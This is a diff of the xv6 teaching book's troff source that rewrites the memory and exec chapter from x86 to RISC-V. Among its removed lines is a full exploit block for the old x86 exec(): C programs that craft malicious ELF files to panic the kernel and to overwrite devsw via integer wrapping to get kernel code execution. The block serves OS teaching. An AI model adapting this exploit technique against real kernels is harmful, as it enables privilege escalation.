@@ -461,22 +461,18 @@ statements, which is what
 and
 .code deallocuvm
 do.
+.PP
 The RISC-V hardware caches page table entries in a
 .italic-index "Translation Look-aside Buffer (TLB)" ,
 and when xv6 changes the page tables, it must invalidate the cached entries.  If
 it didn't invalidate the cached entries, then at some point later the TLB might
 use an old mapping, pointing to a physical page that in the mean time has been
 allocated to another process, and as a result, a process might be able to
-scribble on some other process's memory.
-.code Growproc
-invalidates stale cached entries by calling
-.code switchuvm ,
-which reloads
-.register cr3 ,
-the register that holds the address of the current page table.
-Reloading
-.register cr3
-invalidates all entries in the TLB.
+scribble on some other process's memory.  Reloading the register
+.register satp
+will flush the TLB, and xv6 reloads this register
+when the kernel returns to user space to switch to the user process's
+page table.
 .\"
 .section "Code: exec"
 .\"
@@ -525,22 +521,17 @@ assumes that the binary is well-formed.
 .PP
 .code Exec
 allocates a new page table with no user mappings with
-.code-index setupkvm
-.line kernel/exec.c:/setupkvm/ ,
+.code-index proc_pagetable
+.line kernel/exec.c:/proc_pagetable/ ,
 allocates memory for each ELF segment with
-.code-index allocuvm
-.line kernel/exec.c:/allocuvm/ ,
+.code-index uvmalloc
+.line kernel/exec.c:/uvmalloc/ ,
 and loads each segment into memory with
-.code-index loaduvm
-.line kernel/exec.c:/loaduvm/ .
-.code allocuvm
-checks that the virtual addresses requested
-is below
-.address KERNBASE .
-.code-index loaduvm
-.line kernel/vm.c:/^loaduvm/
+.code-index loadseg
+.line kernel/exec.c:/loadseg/ .
+.code loadseg
 uses
-.code-index walkpgdir
+.code-index walkaddr
 to find the physical address of the allocated memory at which to write
 each page of the ELF segment, and
 .code-index readi
@@ -553,13 +544,13 @@ the first user program created with
 looks like this:
 .P1
 # objdump -p _init
-_init:     file format elf64-x86-64
+user/_init:     file format elf64-littleriscv
 
 Program Header:
-    LOAD off    0x00000000000000b0 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
-         filesz 0x0000000000001061 memsz 0x0000000000001088 flags rwx
+    LOAD off    0x00000000000000b0 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**3
+         filesz 0x0000000000000840 memsz 0x0000000000000858 flags rwx
    STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
-         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rwx
+         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-
 .P2
 .PP
 The program section header's
@@ -571,15 +562,14 @@ with zeroes (for C global variables) rather than read from the file.
 For
 .code /init ,
 .code filesz
-is 4193 bytes and
+is 2112 bytes and
 .code memsz
-is 4232 bytes,
+is 2136 bytes,
 and thus
-.code-index allocuvm
-allocates enough physical memory to hold 4232 bytes, but reads only 4193 bytes
+.code-index uvmalloc
+allocates enough physical memory to hold 2136 bytes, but reads only 2112 bytes
 from the file
 .code /init .
-.PP
 .PP
 Now
 .code-index exec
@@ -635,14 +625,10 @@ The only error cases in
 happen during the creation of the image.
 Once the image is complete,
 .code exec
-can install the new image
-.line kernel/exec.c:/switchuvm/
+can commit to the new page table
+.line kernel/exec.c:/pagetable.=.pagetable/
 and free the old one
-.line kernel/exec.c:/freevm/ .
-Finally,
-.code exec
-returns 0.
-.PP
+.line kernel/exec.c:/proc_freepagetable/ .
 .PP
 .code Exec
 loads bytes from the ELF file into memory at addresses specified by the ELF file.
@@ -654,180 +640,29 @@ or on purpose. The consequences for an unwary kernel could range from
 a crash to a malicious subversion of the kernel's isolation mechanisms
 (i.e., a security exploit).
 xv6 performs a number of checks to avoid these risks.
-To understand the importance of these checks, consider what could happen
-if xv6 didn't check
+For example
 .code "if(ph.vaddr + ph.memsz < ph.vaddr)" .
-This is a check for whether the sum overflows a 64-bit integer.
+checks for whether the sum overflows a 64-bit integer.
 The danger is that a user could construct an ELF binary with a
 .code ph.vaddr
-that points into the kernel,
+that points to a user-chosen address,
 and
 .code ph.memsz
-large enough that the sum overflows to 0x1000.
-Since the sum is small, it would pass the check
-.code "if(newsz >= KERNBASE)"
-in
-. code allocuvm .
-The subsequent call to 
-.code loaduvm
-passes
-.code ph.vaddr
-by itself, without adding
-.code ph.memsz 
-and without checking
-.code ph.vaddr
-against
-.code KERNBASE ,
-and would thus copy data from the ELF binary into the kernel.
-This could be exploited by a user
-program to run arbitrary user code with kernel privileges.  As this example
-illustrates, argument checking must be done with great care.
+large enough that the sum overflows to 0x1000, which will look like a
+valid value. In an older version of xv6 in which the user address
+space also contained the kernel (but not readable/writable in user
+mode), the user could choose an address that corresponded to kernel
+memory and would thus copy data from the ELF binary into the kernel.
+In the RISC-V version of xv6 this cannot happen, because the kernel has
+its own separate page table;
+.code
+loadseg
+loads into the process's page table, not in the kernel's page table.
+.PP
 It is easy for a kernel developer to omit a crucial check, and
 real-world kernels have a long history of missing checks whose absence
 can be exploited by user programs to obtain kernel privileges.  It is likely that xv6 doesn't do a complete job of validating
 user-level data supplied to the kernel, which a malicious user program might be able to exploit to circumvent xv6's isolation.
-.ig
-Example exploit (due to mikecat).
-
-The exec() function in file exec.c had two vulnerabilities.
-
-denial of service via misaligned virtual address
-arbitrary code execution using wrapping in calculation of VM size
-This user application is a exploit code for the first vulnerability.
-
-#include "types.h"
-#include "user.h"
-#include "fcntl.h"
-
-void elfgen(char *name) {
-  static char magic[] = {
-    127,69,76,70,1,1,1,0,0,0,0,0,0,0,0,0,2,0,3,0,1,0,0,0,7,0,0,0,52,0,0,0,
-    84,0,0,0,0,0,0,0,52,0,32,0,1,0,40,0,3,0,2,0,1,0,0,0,204,0,0,0,7,0,0,0,
-    7,0,0,0,7,0,0,0,7,0,0,0,5,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
-    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
-    1,0,0,0,6,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,7,0,0,0,
-    3,0,0,0,0,0,0,0,0,0,0,0,211,0,0,0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
-    0,0,0,0,184,2,0,0,0,205,64,0,46,116,101,120,116,0,46,115,116,114,116,97,98,0
-  };
-  int fd;
-  fd = open(name, O_CREATE | O_WRONLY);
-  if(fd == -1) {
-    printf(2, "open failed\n");
-    exit();
-  }
-  write(fd, magic, sizeof(magic));
-  close(fd);
-}
-
-int main(void) {
-  char name[] = "unaligned";
-  char *argv[2] = {name, 0};
-  elfgen(name);
-  exec(name, argv);
-  printf(2, "exec failed\n");
-  exit();
-}
-This program create ELF having vaddr which isn't multiple of PGSIZE and have the system read it via exec system call.
-Then, the misaligned virtual address is padded to loaduvm() and it leads to panic.
-
-This user application is a exploit code for the second vulnerability.
-
-#include "types.h"
-#include "user.h"
-#include "fcntl.h"
-
-/* Please see kernel.sym and set
- *   DEVSW_ADDR = the address of devsw
- *   PANIC_ADDR = the address of panic
- */
-#define DEVSW_ADDR 0x801111c0u
-#define PANIC_ADDR 0x8010053du
-
-void shellcode(void*, char*, int);
-
-void set4bytes(char *p, uint data) {
-  int i;
-  for (i = 0; i < 4; i++) p[i] = (data >> (8 * i));
-}
-
-void elfgen(char *name) {
-  static char magic[] = {
-    127,69,76,70,1,1,1,0,0,0,11,0,0,0,0,0,2,0,3,0,1,0,0,0,0,0,0,0,52,0,0,0,
-    126,0,0,0,0,0,0,0,52,0,32,0,3,0,40,0,2,0,2,0,1,0,0,0,236,0,0,0,0,0,0,0,
-    0,0,0,0,7,0,0,0,7,0,0,0,5,0,0,0,0,16,0,0,1,0,0,0,2,1,0,0,0,0,0,0,
-    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
-    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
-    1,0,0,0,6,0,0,0,0,0,0,0,236,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,
-    0,0,0,0,7,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,19,1,0,0,15,0,0,0,0,0,0,0,
-    0,0,0,0,0,0,0,0,0,0,0,0,184,2,0,0,0,205,64,0,46,116,101,120,
-    116,0,46,115,116,114,116,97,98,0
-  };
-  static char bomb[(DEVSW_ADDR & 0xfff) + 4] = {0};
-  int fd;
-  fd = open(name, O_CREATE | O_WRONLY);
-  if(fd == -1) {
-    printf(2, "open failed\n");
-    exit();
-  }
-
-  /* address of the program to execute */
-  set4bytes(bomb + (DEVSW_ADDR & 0xfff), (uint)shellcode);
-  /* address of bomb */
-  set4bytes(magic + 0x5C, DEVSW_ADDR & 0xfffff000u);
-  /* size of bomb */
-  set4bytes(magic + 0x64, sizeof(bomb));
-  /* size on memory of bomb */
-  set4bytes(magic + 0x68, 0x1000 - (DEVSW_ADDR & 0xfffff000u));
-
-  /* ELF data */
-  write(fd, magic, sizeof(magic));
-  /* bomb */
-  write(fd, bomb, sizeof(bomb));
-
-  close(fd);
-}
-
-int main(void) {
-  char name[] = "devswhack";
-  char *argv[2] = {name, 0};
-  int pid;
-  elfgen(name);
-  pid = fork();
-  if (pid == -1) {
-    printf(2, "fork failed\n");
-  } else if (pid == 0) {
-    exec(name, argv);
-    printf(2, "exec failed\n");
-  } else {
-    int fd;
-    wait();
-    mknod("shellcode", 0, 0);
-    fd = open("shellcode", O_RDONLY);
-    if (fd < 0) {
-      printf(2, "open failed\n");
-    } else {
-      read(fd, 0, 1);
-      close(fd);
-    }
-  }
-  exit();
-}
-
-void shellcode(void* a, char* b, int c) {
-  void (*panic)(char*) = (void(*)(char*))PANIC_ADDR;
-  panic("vulnerable");
-
-  /* avoid warnings for unused arguments */
-  (void)a; (void)b; (void)c;
-}
-This program generates an ELF and have the system load it via exec system call.
-In loading this ELF, one of ph.vaddr + ph.memsz becomes 0x1000 due to integer wrapping.
-ph.vaddr is pointing at the kernel data, and loaduvm() will overwrite there.
-devsw[0].read will be overwritten by the address of shellcode() via this loading, and after that,
-when this process use read system call for special file with major = 0,
-the function shellcode(), which is created by a user, will be executed according to the overwritten devsw.
-..
-.PP
 .\"
 .section "Real world"
 .\"
@@ -840,36 +675,11 @@ paging from disk, copy-on-write fork, shared memory,
 lazily-allocated pages,
 and automatically extending stacks.
 .PP
-XXXX
 The RISC-V support physical memory protection, but xv6 doesn't use it.
-
-The x86 supports address translation using segmentation (see Appendix \*[APP:BOOT]),
-but xv6 uses segments only for the common trick of
-implementing per-cpu variables such as
-.code proc
-that are at a fixed address but have different values
-on different CPUs (see
-.code-index seginit ).
-Implementations of per-CPU (or per-thread) storage on non-segment
-architectures would dedicate a register to holding a pointer
-to the per-CPU data area, but the x86 has so few general
-registers that the extra effort required to use segmentation
-is worthwhile.
-.PP
-Xv6 maps the kernel in the address space of each user process but sets it up so
-that the kernel part of the address space is inaccessible when the processor is
-in user mode.  This setup is convenient because after a process switches from
-user space to kernel space, the kernel can easily access user memory by reading
-memory locations directly.  It is probably better for security, however, to have
-a separate page table for the kernel and switch to that page table when entering
-the kernel from user mode, so that the kernel and user processes are more
-separated from each other.  This design, for example, would help mitigating
-side-channels that are exposed by the Meltdown vulnerability and that allow a
-user process to read arbitrary kernel memory.
 .PP
 On machines with lots of memory
 it might make sense to use
-the x86's 4-megabytes ``super pages.''
+RISC-V's support for ``super pages.''
 Small pages make sense
 when physical memory is small, to allow allocation and page-out to disk
 with fine granularity.
@@ -877,20 +687,6 @@ For example, if a program
 uses only 8 kilobytes of memory, giving it a 4 megabytes physical page is wasteful.
 Larger pages make sense on machines with lots of RAM,
 and may reduce overhead for page-table manipulation.
-.PP
-Xv6 should determine the actual RAM configuration, instead
-of assuming 224 MB.
-On the x86, there are at least three common algorithms:
-the first is to probe the physical address space looking for
-regions that behave like memory, preserving the values
-written to them;
-the second is to read the number of kilobytes of
-memory out of a known 16-bit location in the PC's non-volatile RAM;
-and the third is to look in BIOS memory
-for a memory layout table left as
-part of the multiprocessor tables.
-Reading the memory layout table
-is complicated.
 .PP
 Memory allocation was a hot topic a long time ago, the basic problems being
 efficient use of limited memory and
@@ -906,7 +702,8 @@ ones.
 .section "Exercises"
 .\"
 .PP
-1. Look at real operating systems to see how they size memory.
+1. Parse RISC-V's device tree to find the amount of physical memory
+the computer has.
 .PP
 2. Write a user program that grows its address space with 1 byte by calling
 .code sbrk(1) .
@@ -919,8 +716,7 @@ How much space has the kernel allocated?  What does the
 .code pte
 for the new memory contain?
 .PP
-3. Modify xv6 so that the pages for the kernel are shared among processes, which
-reduces memory consumption.
+3. Modify xv6 to use super pages for the kernel.
 .PP
 4. Modify xv6 so that when a user program dereferences a null pointer, it will
 receive a fault.  That is, modify xv6 so that virtual address 0 isn't mapped for
@@ -951,16 +747,5 @@ with command line
 .code myprog
 .code arg1 .
 Implement support for this convention in xv6.
-.PP
-6. Delete the check
-.code "if(ph.vaddr + ph.memsz < ph.vaddr)"
-in
-.code exec.c ,
-and construct a user  program that exploits that the check is missing.
-.PP
-7. Change xv6 to use super pages to reduce the number of mappings for the kernel.
-.PP
-8. Change xv6 so that user processes run with only a minimal part of the kernel
-mapped and so that the kernel runs with its own page table that doesn't include
-the user process.
+
 
